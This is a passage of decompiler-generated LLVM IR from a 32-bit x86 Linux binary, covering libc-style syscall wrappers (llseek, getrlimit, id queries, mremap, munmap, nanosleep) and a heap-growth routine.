dec_label_pc_80520f0:                             ; preds = %dec_label_pc_80520d8
  %v1_80520f0 = call i32 @function_805021b(i32 %v2_80520ce)
  store i32 %v1_80520f0, i32* %eax.global-to-local, align 4
  %v1_80520f5 = inttoptr i32 %v1_80520f0 to i32*
  store i32 22, i32* %v1_80520f5, align 4
  br label %dec_label_pc_8052161

dec_label_pc_8052100:                             ; preds = %dec_label_pc_80520be
  %v1_8052100 = add i32 %v0_805210c32, 8
  %v2_8052100 = inttoptr i32 %v1_8052100 to i32*
  %v3_8052100 = load i32, i32* %v2_8052100, align 4
  store i32 %v3_8052100, i32* %eax.global-to-local, align 4
  %v1_8052103 = add i32 %v0_805210c32, 12
  %v2_8052103 = inttoptr i32 %v1_8052103 to i32*
  %v3_8052103 = load i32, i32* %v2_8052103, align 4
  %v1_805210c = inttoptr i32 %v0_805210c32 to i32*
  %v2_805210c = load i32, i32* %v1_805210c, align 4
  store i32 %v2_805210c, i32* %eax.global-to-local, align 4
  %v1_805210e = add i32 %v0_805210c32, 4
  %v2_805210e = inttoptr i32 %v1_805210e to i32*
  %v3_805210e = load i32, i32* %v2_805210e, align 4
  %v2_8052111 = add i32 %v1_805211131, 4
  %v3_8052111 = inttoptr i32 %v2_8052111 to i32*
  store i32 %v3_805210e, i32* %v3_8052111, align 4
  %v0_8052114 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052114 = load i32, i32* @esi, align 4
  %v2_8052114 = inttoptr i32 %v1_8052114 to i32*
  store i32 %v0_8052114, i32* %v2_8052114, align 4
  %v0_8052116 = load i32, i32* @ebx, align 4
  %v1_8052116 = add i32 %v0_8052116, 8
  %v2_8052116 = inttoptr i32 %v1_8052116 to i32*
  %v3_8052116 = load i32, i32* %v2_8052116, align 4
  store i32 %v3_8052116, i32* %eax.global-to-local, align 4
  %v1_8052119 = add i32 %v0_8052116, 12
  %v2_8052119 = inttoptr i32 %v1_8052119 to i32*
  %v3_8052119 = load i32, i32* %v2_8052119, align 4
  %v1_805211c = load i32, i32* @esi, align 4
  %v2_805211c = add i32 %v1_805211c, 12
  %v3_805211c = inttoptr i32 %v2_805211c to i32*
  store i32 %v3_8052119, i32* %v3_805211c, align 4
  %v0_805211f = load i32, i32* %eax.global-to-local, align 4
  %v1_805211f = load i32, i32* @esi, align 4
  %v2_805211f = add i32 %v1_805211f, 8
  %v3_805211f = inttoptr i32 %v2_805211f to i32*
  store i32 %v0_805211f, i32* %v3_805211f, align 4
  %v0_8052122 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052122 = trunc i32 %v0_8052122 to i16
  %v2_8052122 = load i32, i32* @esi, align 4
  %v3_8052122 = add i32 %v2_8052122, 16
  %v4_8052122 = inttoptr i32 %v3_8052122 to i16*
  store i16 %v1_8052122, i16* %v4_8052122, align 2
  %v0_8052126 = load i32, i32* @ebx, align 4
  %v1_8052126 = add i32 %v0_8052126, 18
  %v2_8052126 = inttoptr i32 %v1_8052126 to i8*
  %v3_8052126 = load i8, i8* %v2_8052126, align 1
  %v4_8052126 = zext i8 %v3_8052126 to i32
  %v5_8052126 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052126 = and i32 %v5_8052126, -256
  %v7_8052126 = or i32 %v6_8052126, %v4_8052126
  store i32 %v7_8052126, i32* %eax.global-to-local, align 4
  %v2_8052129 = load i32, i32* @esi, align 4
  %v3_8052129 = add i32 %v2_8052129, 18
  %v4_8052129 = inttoptr i32 %v3_8052129 to i8*
  store i8 %v3_8052126, i8* %v4_8052129, align 1
  %v0_805212c = load i32, i32* %eax.global-to-local, align 4
  %v1_805212c = load i32, i32* @esp, align 4
  %v2_805212c = add i32 %v1_805212c, -4
  %v3_805212c = inttoptr i32 %v2_805212c to i32*
  store i32 %v0_805212c, i32* %v3_805212c, align 4
  %v0_805212d = load i32, i32* @ebx, align 4
  %v1_805212d = add i32 %v0_805212d, 16
  %v2_805212d = inttoptr i32 %v1_805212d to i16*
  %v3_805212d = load i16, i16* %v2_805212d, align 2
  %v4_805212d = zext i16 %v3_805212d to i32
  %v1_8052131 = add nsw i32 %v4_805212d, -19
  %v2_8052134 = add i32 %v1_805212c, -8
  %v3_8052134 = inttoptr i32 %v2_8052134 to i32*
  store i32 %v1_8052131, i32* %v3_8052134, align 4
  %v0_8052135 = load i32, i32* @ebx, align 4
  %v1_8052135 = add i32 %v0_8052135, 19
  %v2_8052138 = add i32 %v1_805212c, -12
  %v3_8052138 = inttoptr i32 %v2_8052138 to i32*
  store i32 %v1_8052135, i32* %v3_8052138, align 4
  %v0_8052139 = load i32, i32* @esi, align 4
  %v1_8052139 = add i32 %v0_8052139, 19
  store i32 %v1_8052139, i32* %eax.global-to-local, align 4
  %v2_805213c = add i32 %v1_805212c, -16
  %v3_805213c = inttoptr i32 %v2_805213c to i32*
  store i32 %v1_8052139, i32* %v3_805213c, align 4
  %v3_805213d = inttoptr i32 %v2_80520ce to i16*
  %v4_805213d = call i32 @function_8052466(i16* %v3_805213d, i32 %v3_8052100, i32 %v3_8052103)
  store i32 %v4_805213d, i32* %eax.global-to-local, align 4
  %v0_8052142 = load i32, i32* @ebx, align 4
  %v1_8052142 = add i32 %v0_8052142, 16
  %v2_8052142 = inttoptr i32 %v1_8052142 to i16*
  %v3_8052142 = load i16, i16* %v2_8052142, align 2
  %v4_8052142 = zext i16 %v3_8052142 to i32
  store i32 %v2_80520ce, i32* @esi, align 4
  %v2_8052149 = add i32 %v4_8052142, %v0_8052142
  store i32 %v2_8052149, i32* @ebx, align 4
  %v0_805214b = load i32, i32* @esp, align 4
  %v1_805214b = add i32 %v0_805214b, 16
  store i32 %v5_8052151, i32* %eax.global-to-local, align 4
  %v7_8052154 = icmp ult i32 %v2_8052149, %v5_8052151
  br i1 %v7_8052154, label %dec_label_pc_80520be, label %dec_label_pc_805215c

dec_label_pc_805215c:                             ; preds = %dec_label_pc_80520a5, %dec_label_pc_8052100, %dec_label_pc_80520d8
  %v0_805215c = phi i32 [ %v0_80520eb, %dec_label_pc_80520d8 ], [ %tmp14, %dec_label_pc_80520a5 ], [ %v2_80520ce, %dec_label_pc_8052100 ]
  store i32 %v0_805215c, i32* %eax.global-to-local, align 4
  %v5_805215e = sub i32 %v0_805215c, %tmp14
  br label %dec_label_pc_8052161

dec_label_pc_8052161:                             ; preds = %dec_label_pc_80520f0, %dec_label_pc_8052090, %dec_label_pc_805215c
  %storemerge = phi i32 [ %v5_805215e, %dec_label_pc_805215c ], [ -1, %dec_label_pc_8052090 ], [ -1, %dec_label_pc_80520f0 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805205a, i32* @ebx, align 4
  store i32 %v0_8052058, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_805215c, { 1, 0 }
  uselistorder i32 %v2_8052149, { 0, 2, 1 }
  uselistorder i32 %v3_8052103, { 1, 0 }
  uselistorder i32 %v3_8052100, { 1, 2, 0 }
  uselistorder i32 %v2_80520ce, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_80520d830, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805210c32, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8052151, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8052083, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 17, 0, 18 }
  uselistorder i32 (i16*, i32, i32)* @function_8052466, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder i32 18, { 1, 2, 3, 0 }
  uselistorder i32 22, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 -12, { 0, 5, 27, 28, 18, 19, 20, 21, 7, 1, 22, 15, 13, 23, 9, 10, 16, 11, 12, 6, 17, 2, 24, 14, 8, 3, 25, 26, 4 }
  uselistorder i32 -8, { 0, 3, 33, 27, 29, 28, 30, 31, 32, 17, 18, 19, 20, 5, 6, 21, 14, 12, 22, 8, 9, 15, 10, 11, 4, 16, 23, 24, 13, 7, 1, 25, 26, 2 }
  uselistorder i32* @esp, { 9, 10, 11, 2, 3, 4, 22, 23, 24, 25, 26, 27, 28, 29, 85, 86, 5, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 7, 73, 8, 103, 104, 105, 17, 18, 19, 20, 21, 62, 63, 64, 65, 66, 67, 41, 42, 43, 44, 45, 46, 74, 75, 76, 0, 77, 78, 79, 80, 81, 82, 83, 84, 57, 58, 59, 60, 61, 68, 1, 69, 70, 71, 72, 106, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 12, 13, 14, 15, 16, 99, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 100, 101, 102, 107, 108, 109, 110, 137, 111, 112, 113, 114, 115, 117, 118, 116, 119, 120, 121, 122, 123, 124, 133, 134, 135, 125, 126, 127, 128, 129, 130, 131, 132, 6, 136 }
  uselistorder i32 15, { 2, 1, 3, 0 }
  uselistorder i32 -16, { 0, 7, 43, 44, 31, 32, 33, 34, 11, 1, 35, 8, 25, 26, 21, 22, 17, 36, 37, 12, 13, 14, 15, 16, 27, 28, 18, 19, 20, 9, 10, 29, 30, 3, 38, 39, 23, 24, 2, 4, 5, 40, 41, 42, 6 }
  uselistorder i32 30, { 3, 2, 1, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052161, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805215c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80520be, { 1, 0 }
}

define i32 @function_8052169() local_unnamed_addr {
dec_label_pc_8052169:
  %stack_var_-8 = alloca i32, align 4
  %v2_805216c = ptrtoint i32* %stack_var_-8 to i32
  %v2_8052173 = call i32 @function_8052213(i32 7, i32 %v2_805216c)
  store i32 256, i32* @edx, align 4
  %v2_8052180 = icmp slt i32 %v2_8052173, 0
  br i1 %v2_8052180, label %dec_label_pc_8052188, label %dec_label_pc_8052184

dec_label_pc_8052184:                             ; preds = %dec_label_pc_8052169
  %v3_8052184 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8052184, i32* @edx, align 4
  br label %dec_label_pc_8052188

dec_label_pc_8052188:                             ; preds = %dec_label_pc_8052169, %dec_label_pc_8052184
  %v0_8052188 = phi i32 [ 256, %dec_label_pc_8052169 ], [ %v3_8052184, %dec_label_pc_8052184 ]
  ret i32 %v0_8052188

; uselistorder directives
  uselistorder i32 7, { 3, 0, 4, 1, 2, 7, 8, 9, 6, 5 }
  uselistorder label %dec_label_pc_8052188, { 1, 0 }
}

define i32 @function_805218e() local_unnamed_addr {
dec_label_pc_805218e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805218e = load i32, i32* @ebx, align 4
  store i32 %v0_805218e, i32* %stack_var_-4, align 4
  %v1_8052197 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8052197, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052197, -4095
  br i1 %tmp7, label %dec_label_pc_80521ae, label %dec_label_pc_80521a2

dec_label_pc_80521a2:                             ; preds = %dec_label_pc_805218e
  %v1_80521a2 = call i32 @function_805021b(i32 %v0_805218e)
  %v0_80521a7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521a7 = sub i32 0, %v0_80521a7
  %v2_80521a9 = inttoptr i32 %v1_80521a2 to i32*
  store i32 %v1_80521a7, i32* %v2_80521a9, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80521b2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521ae

dec_label_pc_80521ae:                             ; preds = %dec_label_pc_805218e, %dec_label_pc_80521a2
  %v2_80521b2 = phi i32 [ %v0_805218e, %dec_label_pc_805218e ], [ %v2_80521b2.pre, %dec_label_pc_80521a2 ]
  %v0_80521ae = phi i32 [ %v1_8052197, %dec_label_pc_805218e ], [ -1, %dec_label_pc_80521a2 ]
  store i32 %v2_80521b2, i32* @ebx, align 4
  ret i32 %v0_80521ae

; uselistorder directives
  uselistorder i32 %v1_8052197, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521ae, { 1, 0 }
}

define i32 @function_80521b4() local_unnamed_addr {
dec_label_pc_80521b4:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80521b4, i32* %stack_var_-4, align 4
  %v1_80521bd = call i32 @int80_syscall(i32 201)
  store i32 %v1_80521bd, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80521bd, -4095
  br i1 %tmp7, label %dec_label_pc_80521d4, label %dec_label_pc_80521c8

dec_label_pc_80521c8:                             ; preds = %dec_label_pc_80521b4
  %v1_80521c8 = call i32 @function_805021b(i32 %v0_80521b4)
  %v0_80521cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521cd = sub i32 0, %v0_80521cd
  %v2_80521cf = inttoptr i32 %v1_80521c8 to i32*
  store i32 %v1_80521cd, i32* %v2_80521cf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80521d8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521d4

dec_label_pc_80521d4:                             ; preds = %dec_label_pc_80521b4, %dec_label_pc_80521c8
  %v2_80521d8 = phi i32 [ %v0_80521b4, %dec_label_pc_80521b4 ], [ %v2_80521d8.pre, %dec_label_pc_80521c8 ]
  %v0_80521d4 = phi i32 [ %v1_80521bd, %dec_label_pc_80521b4 ], [ -1, %dec_label_pc_80521c8 ]
  store i32 %v2_80521d8, i32* @ebx, align 4
  ret i32 %v0_80521d4

; uselistorder directives
  uselistorder i32 %v1_80521bd, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521d4, { 1, 0 }
}

define i32 @function_80521da() local_unnamed_addr {
dec_label_pc_80521da:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521da = load i32, i32* @ebx, align 4
  store i32 %v0_80521da, i32* %stack_var_-4, align 4
  %v1_80521e3 = call i32 @int80_syscall(i32 200)
  store i32 %v1_80521e3, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80521e3, -4095
  br i1 %tmp7, label %dec_label_pc_80521fa, label %dec_label_pc_80521ee

dec_label_pc_80521ee:                             ; preds = %dec_label_pc_80521da
  %v1_80521ee = call i32 @function_805021b(i32 %v0_80521da)
  %v0_80521f3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521f3 = sub i32 0, %v0_80521f3
  %v2_80521f5 = inttoptr i32 %v1_80521ee to i32*
  store i32 %v1_80521f3, i32* %v2_80521f5, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80521fe.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80521fa

dec_label_pc_80521fa:                             ; preds = %dec_label_pc_80521da, %dec_label_pc_80521ee
  %v2_80521fe = phi i32 [ %v0_80521da, %dec_label_pc_80521da ], [ %v2_80521fe.pre, %dec_label_pc_80521ee ]
  %v0_80521fa = phi i32 [ %v1_80521e3, %dec_label_pc_80521da ], [ -1, %dec_label_pc_80521ee ]
  store i32 %v2_80521fe, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80521fa

; uselistorder directives
  uselistorder i32 %v1_80521e3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521fa, { 1, 0 }
}

define i32 @function_8052200() local_unnamed_addr {
dec_label_pc_8052200:
  %v0_8052200 = load i32, i32* @global_var_8053144.63, align 4
  %v1_805220a = icmp eq i32 %v0_8052200, 0
  %.v0_8052200 = select i1 %v1_805220a, i32 4096, i32 %v0_8052200
  store i32 %.v0_8052200, i32* @edx, align 4
  ret i32 %.v0_8052200

; uselistorder directives
  uselistorder i32 4096, { 0, 2, 3, 1 }
}

define i32 @function_8052213(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052213:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052213 = load i32, i32* @ebx, align 4
  store i32 %v0_8052213, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8052226 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8052226, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8052226, -4095
  br i1 %tmp9, label %dec_label_pc_805223f, label %dec_label_pc_8052233

dec_label_pc_8052233:                             ; preds = %dec_label_pc_8052213
  %v1_8052233 = call i32 @function_805021b(i32 %v0_8052213)
  %v0_8052238 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052238 = sub i32 0, %v0_8052238
  %v2_805223a = inttoptr i32 %v1_8052233 to i32*
  store i32 %v1_8052238, i32* %v2_805223a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052243.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805223f

dec_label_pc_805223f:                             ; preds = %dec_label_pc_8052213, %dec_label_pc_8052233
  %v2_8052243 = phi i32 [ %v0_8052213, %dec_label_pc_8052213 ], [ %v2_8052243.pre, %dec_label_pc_8052233 ]
  %v0_805223f = phi i32 [ %v1_8052226, %dec_label_pc_8052213 ], [ -1, %dec_label_pc_8052233 ]
  store i32 %v2_8052243, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805223f

; uselistorder directives
  uselistorder i32 %v1_8052226, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805223f, { 1, 0 }
}

define i32 @function_8052245() local_unnamed_addr {
dec_label_pc_8052245:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052245 = load i32, i32* @ebx, align 4
  store i32 %v0_8052245, i32* %stack_var_-4, align 4
  %v1_805224e = call i32 @int80_syscall(i32 199)
  store i32 %v1_805224e, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805224e, -4095
  br i1 %tmp7, label %dec_label_pc_8052265, label %dec_label_pc_8052259

dec_label_pc_8052259:                             ; preds = %dec_label_pc_8052245
  %v1_8052259 = call i32 @function_805021b(i32 %v0_8052245)
  %v0_805225e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805225e = sub i32 0, %v0_805225e
  %v2_8052260 = inttoptr i32 %v1_8052259 to i32*
  store i32 %v1_805225e, i32* %v2_8052260, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052269.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052265

dec_label_pc_8052265:                             ; preds = %dec_label_pc_8052245, %dec_label_pc_8052259
  %v2_8052269 = phi i32 [ %v0_8052245, %dec_label_pc_8052245 ], [ %v2_8052269.pre, %dec_label_pc_8052259 ]
  %v0_8052265 = phi i32 [ %v1_805224e, %dec_label_pc_8052245 ], [ -1, %dec_label_pc_8052259 ]
  store i32 %v2_8052269, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052265

; uselistorder directives
  uselistorder i32 %v1_805224e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052265, { 1, 0 }
}

define i32 @function_805226b(i32 %arg1) local_unnamed_addr {
dec_label_pc_805226b:
  %esi.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_8052281 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052281, i32* %esi.global-to-local, align 4
  %v1_8052298 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8052298, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8052298, -4095
  br i1 %tmp18, label %dec_label_pc_80522b2, label %dec_label_pc_80522a4

dec_label_pc_80522a4:                             ; preds = %dec_label_pc_805226b
  %v2_8052285 = ashr i32 %tmp8, 31
  %v1_80522a4 = call i32 @function_805021b(i32 %v2_8052285)
  %v0_80522a9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522a9 = sub i32 0, %v0_80522a9
  %v2_80522ab = inttoptr i32 %v1_80522a4 to i32*
  store i32 %v1_80522a9, i32* %v2_80522ab, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80522b6

dec_label_pc_80522b2:                             ; preds = %dec_label_pc_805226b
  %v1_80522b2 = icmp eq i32 %v1_8052298, 0
  br i1 %v1_80522b2, label %dec_label_pc_80522bb, label %dec_label_pc_80522b6

dec_label_pc_80522b6:                             ; preds = %dec_label_pc_80522b2, %dec_label_pc_80522a4
  %v0_80522b6 = phi i32 [ %v1_8052298, %dec_label_pc_80522b2 ], [ -1, %dec_label_pc_80522a4 ]
  br label %dec_label_pc_80522c3

dec_label_pc_80522bb:                             ; preds = %dec_label_pc_80522b2
  %v3_80522bb = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80522c3

dec_label_pc_80522c3:                             ; preds = %dec_label_pc_80522b6, %dec_label_pc_80522bb
  %v0_80522c9 = phi i32 [ %v0_80522b6, %dec_label_pc_80522b6 ], [ %v3_80522bb, %dec_label_pc_80522bb ]
  ret i32 %v0_80522c9

; uselistorder directives
  uselistorder i32 %v1_8052298, { 1, 2, 0, 3 }
  uselistorder i32 31, { 5, 3, 0, 1, 4, 2, 6 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80522c3, { 1, 0 }
}

define i32 @function_80522ca(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_80522ca:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80522cb = load i32, i32* @esi, align 4
  store i32 %v0_80522cb, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80522e3 = load i32, i32* @ebx, align 4
  %v5_80522eb = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_80522eb = ptrtoint i32* %v5_80522eb to i32
  store i32 %v0_80522e3, i32* @ebx, align 4
  store i32 %v6_80522eb, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_80522eb, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_80522f7, label %dec_label_pc_8052303

dec_label_pc_80522f7:                             ; preds = %dec_label_pc_80522ca
  %v1_80522f7 = call i32 @function_805021b(i32 %v0_80522e3)
  %v0_80522fc = load i32, i32* %esi.global-to-local, align 4
  %v1_80522fc = sub i32 0, %v0_80522fc
  %v2_80522fe = inttoptr i32 %v1_80522f7 to i32*
  store i32 %v1_80522fc, i32* %v2_80522fe, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052306.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052303

dec_label_pc_8052303:                             ; preds = %dec_label_pc_80522ca, %dec_label_pc_80522f7
  %v2_8052306 = phi i32 [ %v0_80522cb, %dec_label_pc_80522ca ], [ %v2_8052306.pre, %dec_label_pc_80522f7 ]
  %v0_8052303 = phi i32 [ %v6_80522eb, %dec_label_pc_80522ca ], [ -1, %dec_label_pc_80522f7 ]
  store i32 %v2_8052306, i32* @esi, align 4
  ret i32 %v0_8052303

; uselistorder directives
  uselistorder i32 %v0_80522e3, { 1, 0 }
  uselistorder label %dec_label_pc_8052303, { 1, 0 }
}

define i32 @function_8052309(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052309:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052309 = load i32, i32* @ebx, align 4
  store i32 %v0_8052309, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_805231c = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_805231c, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_805231c, -4095
  br i1 %tmp10, label %dec_label_pc_8052335, label %dec_label_pc_8052329

dec_label_pc_8052329:                             ; preds = %dec_label_pc_8052309
  %v1_8052329 = call i32 @function_805021b(i32 %v0_8052309)
  %v0_805232e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805232e = sub i32 0, %v0_805232e
  %v2_8052330 = inttoptr i32 %v1_8052329 to i32*
  store i32 %v1_805232e, i32* %v2_8052330, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052339.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052335

dec_label_pc_8052335:                             ; preds = %dec_label_pc_8052309, %dec_label_pc_8052329
  %v2_8052339 = phi i32 [ %v0_8052309, %dec_label_pc_8052309 ], [ %v2_8052339.pre, %dec_label_pc_8052329 ]
  %v0_8052335 = phi i32 [ %v3_805231c, %dec_label_pc_8052309 ], [ -1, %dec_label_pc_8052329 ]
  %v2_8052337 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052337, i32* @edx, align 4
  store i32 %v2_8052339, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052335

; uselistorder directives
  uselistorder i32 %v3_805231c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052335, { 1, 0 }
}

define i32 @function_805233b(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805233b:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_805233b = load i32, i32* @ebx, align 4
  store i32 %v0_805233b, i32* %stack_var_-4, align 4
  %v4_805233f = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_805233f, i32* %ebx.global-to-local, align 4
  %v6_805234e = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_805234e, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_805234e, -4095
  br i1 %tmp11, label %dec_label_pc_8052367, label %dec_label_pc_805235b

dec_label_pc_805235b:                             ; preds = %dec_label_pc_805233b
  %v1_805235b = call i32 @function_805021b(i32 %v0_805233b)
  %v0_8052360 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052360 = sub i32 0, %v0_8052360
  %v2_8052362 = inttoptr i32 %v1_805235b to i32*
  store i32 %v1_8052360, i32* %v2_8052362, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805236b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052367

dec_label_pc_8052367:                             ; preds = %dec_label_pc_805233b, %dec_label_pc_805235b
  %v2_805236b = phi i32 [ %v0_805233b, %dec_label_pc_805233b ], [ %v2_805236b.pre, %dec_label_pc_805235b ]
  %v0_8052367 = phi i32 [ %v6_805234e, %dec_label_pc_805233b ], [ -1, %dec_label_pc_805235b ]
  store i32 %v2_805236b, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052367

; uselistorder directives
  uselistorder i32 %v6_805234e, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052367, { 1, 0 }
}

define i32 @function_805236d(i32 %arg1) local_unnamed_addr {
dec_label_pc_805236d:
  %stack_var_-12 = alloca i32, align 4
  %v0_805236e = load i32, i32* @ebx, align 4
  %v0_8052372 = load i32, i32* @global_var_8053158.70, align 8
  %v1_8052372 = icmp eq i32 %v0_8052372, 0
  %v1_805237d = icmp eq i1 %v1_8052372, false
  br i1 %v1_805237d, label %dec_label_pc_8052390, label %dec_label_pc_805237f

dec_label_pc_805237f:                             ; preds = %dec_label_pc_805236d
  %v1_8052384 = call i32 @function_805254b(i32 0)
  %v2_805238c = icmp slt i32 %v1_8052384, 0
  br i1 %v2_805238c, label %dec_label_pc_80523b2, label %dec_label_pc_805237f.dec_label_pc_8052390_crit_edge

dec_label_pc_805237f.dec_label_pc_8052390_crit_edge: ; preds = %dec_label_pc_805237f
  %v0_8052392.pre = load i32, i32* @global_var_8053158.70, align 8
  br label %dec_label_pc_8052390

dec_label_pc_8052390:                             ; preds = %dec_label_pc_805237f.dec_label_pc_8052390_crit_edge, %dec_label_pc_805236d
  %v0_80523a0 = phi i32 [ %v0_8052392.pre, %dec_label_pc_805237f.dec_label_pc_8052390_crit_edge ], [ %v0_8052372, %dec_label_pc_805236d ]
  %v1_8052390 = icmp eq i32 %arg1, 0
  %v1_8052397 = icmp eq i1 %v1_8052390, false
  store i32 %v0_80523a0, i32* @ebx, align 4
  br i1 %v1_8052397, label %dec_label_pc_805239d, label %dec_label_pc_80523b5

dec_label_pc_805239d:                             ; preds = %dec_label_pc_8052390
  %v2_80523a2 = add i32 %v0_80523a0, %arg1
  %v1_80523a6 = call i32 @function_805254b(i32 %v2_80523a2)
  %v2_80523ae = icmp slt i32 %v1_80523a6, 0
  %v1_80523b0 = icmp eq i1 %v2_80523ae, false
  br i1 %v1_80523b0, label %dec_label_pc_805239d.dec_label_pc_80523b5_crit_edge, label %dec_label_pc_80523b2

dec_label_pc_805239d.dec_label_pc_80523b5_crit_edge: ; preds = %dec_label_pc_805239d
  %v0_80523b5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80523b5

dec_label_pc_80523b2:                             ; preds = %dec_label_pc_805239d, %dec_label_pc_805237f
  br label %dec_label_pc_80523b5

